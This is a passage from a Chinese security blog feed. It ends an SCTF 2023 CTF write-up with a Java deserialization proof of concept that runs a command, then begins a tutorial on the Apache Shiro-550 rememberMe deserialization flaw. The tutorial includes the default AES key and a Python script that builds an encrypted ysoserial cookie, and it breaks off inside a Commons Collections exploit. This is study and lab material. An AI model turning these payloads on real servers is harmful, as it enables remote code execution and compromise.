class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.fasterxml.jackson.databind.node.POJONode;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">11</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">        <span class="comment">//serial(exp);</span></span><br><span class="line">        <span class="comment">//serialize(exp);</span></span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    public static void doPOST(byte[] obj) throws Exception&#123;</span></span><br><span class="line"><span class="comment">//        HttpHeaders requestHeaders = new HttpHeaders();</span></span><br><span class="line"><span class="comment">//        requestHeaders.set(&quot;Content-Type&quot;, &quot;text/plain&quot;);</span></span><br><span class="line"><span class="comment">//        URI url = new URI(&quot;http://112.124.14.13:8080/bypassit&quot;);</span></span><br><span class="line"><span class="comment">//        HttpEntity&lt;byte[]&gt; requestEntity = new HttpEntity &lt;&gt; (obj,requestHeaders);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        RestTemplate restTemplate = new RestTemplate();</span></span><br><span class="line"><span class="comment">//        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span></span><br><span class="line"><span class="comment">//        System.out.println(res.getBody());</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(<strong>不知道为啥  这里我只能用这种形式的poc才能弹计算器    如果用<code>xx.class</code>这种形式的poc的话  是弹不出计算器的。。。。。。。</strong>)</p><p>这里注意的一点就是  新建项目的时候</p><p><img src="../images/image-20230624210123241.png" alt="image-20230624210123241"><em>**</em></p><p>得把<code>BaseJsonNode</code>里的这个东西给注释掉</p><p><strong>不然会报错</strong></p><p>这其实不是预期解  </p><p><img src="../images/image-20230624210304228.png" alt="image-20230624210304228"></p><p>预期解是打这个<code>hessian</code>这条链子</p><p><strong>官方wp是这样说的</strong></p><p><img src="../images/image-20230624210928869.png" alt="image-20230624210928869"></p><h2 id="an4er-monitor"><a href="#an4er-monitor" class="headerlink" title="an4er_monitor"></a>an4er_monitor</h2><p><strong>描述</strong></p><p><img src="../images/image-20230624212738790.png" alt="image-20230624212738790"></p><p>没环境   看官方wp有个思路就行了  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ezcheck1n&quot;&gt;&lt;a href=&quot;#ezcheck1n&quot; class=&quot;headerlink&quot; title=&quot;ezcheck1n&quot;&gt;&lt;/a&gt;&lt;strong&gt;ezcheck1n&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;figure class=&quot;hig</summary>
      
    
    
    
    
    <category term="sctf-web-2023" scheme="https://ke1nys.github.io/tags/sctf-web-2023/"/>
    
  </entry>
  
  <entry>
    <title>java-shiro</title>
    <link href="https://ke1nys.github.io/posts/55797267.html"/>
    <id>https://ke1nys.github.io/posts/55797267.html</id>
    <published>2023-06-19T08:49:08.000Z</published>
    <updated>2023-06-21T08:41:22.399Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.cn/post/7133959651653058574">参考文章1</a>     <a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">参考视频 </a>  <a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">参考文章2</a></p><p>(<strong>主要看参考文章2</strong>)</p><h2 id="Shiro简介"><a href="#Shiro简介" class="headerlink" title="Shiro简介"></a>Shiro简介</h2><p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3DApache%26spm%3D1001.2101.3001.7020">Apache</a> Shiro 是一个强大易用的Java安全框架,提供了认证、授权、加密和会话管理等功能，Shiro框架直观、易用、同时也能提供健壮的安全性。</p><p>Apache Shiro<a href="https://link.juejin.cn/?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3D%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%26spm%3D1001.2101.3001.7020">反序列化</a>漏洞分为两种：<strong>Shiro-550</strong>、<strong>Shiro-721</strong></p><h2 id="Shiro-550反序列化漏洞"><a href="#Shiro-550反序列化漏洞" class="headerlink" title="Shiro-550反序列化漏洞"></a>Shiro-550反序列化漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。 那么，Payload产生的过程： 命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值 在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Shiro &lt; 1.2.4</p><h3 id="Shiro反序列化的特征"><a href="#Shiro反序列化的特征" class="headerlink" title="Shiro反序列化的特征"></a>Shiro反序列化的特征</h3><p>返回包中会包含rememberMe=deleteMe字段</p><p>这种情况大多会发生在登录处，返回包里包含remeberMe=deleteMe字段，这个是在返回包中(Response)</p><p>如果返回的数据包中没有remeberMe=deleteMe字段的话，可以在数据包中的Cookie中添加remeberMe=deleteMe字段这样也会在返回包中有这个字段</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这里用的P神给的环境 ：<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><ul><li>JDK 8u65</li><li>Tomcat 9</li><li>Shiro 1.2.4</li><li>Commons Collection 3.2.1</li></ul><p>先把p神的项目下载下来</p><p><img src="../images/image-20230619172524775.png" alt="image-20230619172524775"></p><p>然后用<code>idea</code>打开<code>shirodemo</code></p><p><img src="../images/image-20230619172551611.png" alt="image-20230619172551611"></p><p>接着就是配置<code>tomacat</code>了</p><p><img src="../images/image-20230619172643791.png" alt="image-20230619172643791"></p><p>先去官网把他下载下来</p><p>然后进入idea打开设置</p><p><img src="../images/image-20230619172728851.png" alt="image-20230619172728851"></p><p><img src="../images/image-20230619172749282.png" alt="image-20230619172749282"></p><p>添加tomacat的路径</p><p><img src="../images/image-20230619172816282.png" alt="image-20230619172816282"></p><p>接着点击这个</p><p><img src="../images/image-20230619172838144.png" alt="image-20230619172838144"></p><p>先配置这个</p><p><img src="../images/image-20230619172854359.png" alt="image-20230619172854359"></p><p>最后就完成了</p><p><img src="../images/image-20230619172911210.png" alt="image-20230619172911210"></p><h3 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h3><p>先抓个包看看  </p><p>默认账号密码</p><ul><li>root</li><li>secret</li></ul><p><strong>(重点是得勾选这个<code>remember me</code>)</strong></p><p><img src="../images/image-20230619173801606.png" alt="image-20230619173801606"></p><p><strong>固定会返回这个<code>rememberMe=deleteMe</code></strong></p><p>并且这个<code>cookie</code>很长(<strong>这就说明了这个cookie存着一些信息</strong>)</p><p>我们就去代码里找一下看这个<code>cookie</code>是怎么生成的</p><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p><strong>在登录成功后会对cookie进行编码加密 ，我们来跟一下这个加密流程</strong></p><p>入口是在 <code>AbstractRememberMeManager.onSuccessfulLogin</code> 方法</p><p><img src="../images/image-20230619175908159.png" alt="image-20230619175908159"></p><p>判断 token 是否为 true，然后调用 <code>rememberIdentity</code>：</p><p><img src="../images/image-20230619180002676.png" alt="image-20230619180002676"></p><p>看一下这个 <code>getIdentityToRemember</code>：</p><p><img src="../images/image-20230619180033277.png" alt="image-20230619180033277"></p><p>大致就是获取用户名赋值给 <code>principals</code>。</p><p>回到<code>rememberIdentity</code>跟进<code>this.rememberIdentity(subject, principals)</code>：</p><p><img src="../images/image-20230619180132520.png" alt="image-20230619180132520"></p><p>跟进 <code>convertPrincipalsToBytes</code> 看看：</p><p><img src="../images/image-20230619180150004.png" alt="image-20230619180150004"></p><p>先对用户名进行序列化处理，然后调用了个<code>this.getCipherService()</code>方法是否有返回值，跟进查看：</p><p><img src="../images/image-20230619180226872.png" alt="image-20230619180226872"></p><p>返回了一种 AES 的加密方式CBC。</p><p>回到<code>convertPrincipalsToBytes</code>方法，接着调用<code>this.encrypt(bytes)</code>对序列化后的用户名进行加密操作，跟进：</p><p><img src="../images/image-20230619180301097.png" alt="image-20230619180301097"></p><p>这里同样是先用<code>getCipherService</code>方法获取一个加密方式，如果不是空则用该加密方式调用<code>encrypt</code>方法进行加密，AES加密是个对称加密需要密钥，所以这里用<code>getEncryptionCipherKey</code>获取一个密钥，跟进看看：</p><p><img src="../images/image-20230619180347089.png" alt="image-20230619180347089"></p><p>看来是直接返回了这个密钥，由于我们知道这个漏洞就是因为密钥是硬编码写好的造成的，所以我们往回找找这个密钥是哪里赋值的。</p><p>找到这个AbstractRememberMeManager类初始化的时候会，调用<code>setCipherKey</code>方法来设置密钥：</p><p><img src="../images/image-20230619180422223.png" alt="image-20230619180422223"></p><p>跟进<code>setCipherKey</code>方法瞧一眼：</p><p><strong><img src="../images/image-20230619180444210.png" alt="image-20230619180444210"></strong></p><p>正如上面说的AES是对称加密，加密和解密的密钥是同一个，这里就是用传进来的密钥分别赋值给加密密钥和解密密钥，跟进<code>setEncryptionCipherKey</code>：</p><p><img src="../images/image-20230619180515710.png" alt="image-20230619180515710"></p><p>这里就是直接赋值了（吐槽下，真套呀，不过还能看得懂，没套晕）</p><p>回到AbstractRememberMeManager类初始化的<code>this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</code>这里，这里传入的静态变量DEFAULT_CIPHER_KEY_BYTES实在类定义里面写好的：</p><p><img src="../images/image-20230619180524282.png" alt="image-20230619180524282"></p><p>就是说这个 <code>encryptionCipherKey</code> 是 <code>kPH+bIxk5D2deZiIxcaaaA==</code> 的解密，是一个常量 就是说让用户名的序列化和一个常量进入 <code>cipherService.encrypt</code> 进行加密：</p><p><img src="../images/image-20230619180616452.png" alt="image-20230619180616452"></p><p>具体加密就不看了，不懂密码学。</p><p>总之对学列化后的用户名进行AES加密之后会返回字节到<code>rememberIdentity</code>方法：</p><p><img src="../images/image-20230619180706415.png" alt="image-20230619180706415"></p><p>进入下一步的<code>rememberSerializedIdentity</code>方法：</p><p><img src="../images/image-20230619181422498.png" alt="image-20230619181422498"></p><p>刚才都还是在AbstractRememberMeManager类里面调用，这时候就来到了CookieRememberMeManager类里面，看类名大概能猜到是处理cookie的了。</p><p>这里逻辑就是对传进来的字节进行base64加密，然后设置为名字为rememberMe的cookie值。(<strong>根据这个函数名得知，这里是会对cookie进行序列化处理的</strong>)</p><h3 id="解密分析"><a href="#解密分析" class="headerlink" title="解密分析"></a>解密分析</h3><p>现在我们从<code>getRememberedIdentity</code>开始分析，文件位置 <code>org/apache/shiro/mgt/DefaultSecurityManager.java</code></p><p><img src="../images/image-20230619182115535.png" alt="image-20230619182115535"></p><p>跟进到<code>getRememberedPrincipals</code>：</p><p><img src="../images/image-20230619182143104.png" alt="image-20230619182143104"></p><p>继续跟到<code>getRememberedSerializedIdentity</code>：</p><p><img src="../images/image-20230619182230245.png" alt="image-20230619182230245"></p><p>这里的逻辑是先获取cookie中rememberMe的值，然后判断是否是deleteMe，不是则判断是否是符合base64的编码长度，然后再对其进行base64解码，将解码结果返回。</p><p>返回 <code>getRememberedPrincipals</code>方法，下一步跟进 <code>convertBytesToPrincipals</code>方法：</p><p><img src="../images/image-20230619182456872.png" alt="image-20230619182456872"></p><p>可以看到就进行了两个操作 <code>decrypt</code> 和 <code>deserialize</code>。解密就是和加密的逆过程，不多说，进入 <code>deserialize</code>：</p><p><img src="../images/image-20230619182549894.png" alt="image-20230619182549894"></p><p>继续跟进套娃的<code>deserialize</code>：</p><p><img src="../images/image-20230619182713824.png" alt="image-20230619182713824"></p><p>发现<code>readObject</code>方法出现了，下面就可以愉快地进行反序列化了！</p><p><strong>加密解密跟解密都跟完了</strong>  </p><p>(<strong>如果我们能根据这个固定密钥来伪造cookie的话，这样的话就可以进行恶意操作了</strong>)</p><h3 id="AES密钥判断"><a href="#AES密钥判断" class="headerlink" title="AES密钥判断"></a>AES密钥判断</h3><p>前面说到 Shiro 1.2.4以上版本官方移除了代码中的默认密钥，要求开发者自己设 置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。 但是即使升级到了1.2.4以上的版本，很多开源的项目会自己设定密钥。可以收集密钥的集合，或者对密钥进行爆破。</p><p>那么如何判断密钥是否正确呢？文章<a href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect">一种另类的 shiro 检测方式</a>提供了思路，当密钥不正确或类型转换异常时，目标Response包含<code>Set-Cookie：rememberMe=deleteMe</code>字段，而当密钥正确且没有类型转换异常时，返回包不存在<code>Set-Cookie：rememberMe=deleteMe</code>字段。</p><p>因此我们需要构造payload<strong>排除类型转换错误</strong>，进而准确判断密钥。</p><p>shiro在1.4.2版本之前， AES的模式为CBC， IV是随机生成的，并且IV并没有真正使用起来，所以整个AES加解密过程的key就很重要了，正是因为AES使用Key泄漏导致反序列化的cookie可控，从而引发反序列化漏洞。在1.4.2版本后，shiro已经更换加密模式 AES-CBC为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p><p><a href="https://www.cnblogs.com/zpchcbd/p/15092263.html">可测试key是否正确</a></p><h3 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h3><p>通过漏洞原理可以知道，构造Payload需要将利用链通过AES加密后在base64编码。将Payload的值设置为rememberMe的cookie值，这里借助ysoserial中的URLDNS链去打，<strong>由于URLDNS不依赖于Commons Collections包，只需要JDK的包就行，所有一半用于检测是否存在漏洞</strong>。</p><p><strong>python脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2020/10/16 17:36</span></span><br><span class="line"><span class="comment"># @Author  : nice0e3</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    ：https://www.cnblogs.com/nice0e3/</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">r&#x27;D:\Program Files\Java\jdk1.8.0_301\bin\java.exe&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">r&#x27;F:\CTF资料\CTF工具\ysoserial\target\ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="string">&#x27;URLDNS&#x27;</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 替换dnslog</span></span><br><span class="line">    payload = rememberme(<span class="string">&#x27;http://dq6w3y.dnslog.cn&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure><p>将得到的payload用Burp传入rememberMe的cookie值中：</p><p><strong>当存在 JSESSIONID 时，会忽略 rememberMe，所以在攻击时需要将 JSESSIONID 删掉</strong></p><p><img src="../images/image-20230619201344721.png" alt="image-20230619201344721"></p><p><img src="../images/image-20230619201350611.png" alt="image-20230619201350611"></p><p>成功</p><h3 id="CC6-TemplatesImpl链"><a href="#CC6-TemplatesImpl链" class="headerlink" title="CC6+TemplatesImpl链"></a>CC6+TemplatesImpl链</h3><p>但是仅仅是URLDNS是不够的，我们想要的是执行恶意代码，所以先引入Commons Collections 3.2.1 包来进行利用构造。</p><p>(<strong>这里用常规的<code>cc6</code>链子是打不通的，用了话会报错，导致无法执行</strong>)<br>(<strong>就是反序列化流中包含非Java自身的数组，则会出现无法加载类的错误</strong>)</p><p><strong>我们就得去找cc中还有没有没用数组的来替换cc6中使用数组的部分</strong></p><p>这里感兴趣为啥的话可以看看 <a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">参考文章2</a></p><p><img src="../images/20220503212131.png" alt="img"></p><p><strong>这次用这张图片   觉得写的不错</strong></p><p>我们不难发现实际上CC4和CC2是没有用到Transformer数组的，但CC4依赖的是Commons Collections4这个包，当前环境无法使用这条链，拿还有啥方法呢？</p><p>我们可以尝试去改造CC6这条链的后半部分，在CC6链中，我们用到了一个类， <code>TiedMapEntry</code> ，其构造函数接受两个参数，参数1是一个Map，参数2是一个对象key。TiedMapEntry 类有个 <code>getValue</code> 方法，调用了map的get方法，并传入key：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点就是这个<strong>key</strong></p><p>当这个map是<code>LazyMap</code>时，其get方法就是触发<code>transform</code>的关键点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们以往构造CommonsCollections Gadget的时候，对 <code>LazyMap#get</code> 方法的参数key是不关心的，因为通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化恶意对象。</p><p>但是此时我们无法使用Transformer数组了，也就不能再用ConstantTransformer了。此时我们却惊奇的发现，这个 <code>LazyMap#get</code> 的参数key，会被传进<code>transform()</code>，实际上它可以扮演 ConstantTransformer的角色——一个简单的对象传递者。</p><p>我们<code>LazyMap.get(key)</code>直接调用<code>InvokerTransfomer.transform(key)</code>，然后像CC2那样调用<code>TempalteImpl.newTransformer()</code>来完成后续调用。</p><p><img src="../images/20220503224146.png" alt="img"></p><p><strong>最终exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 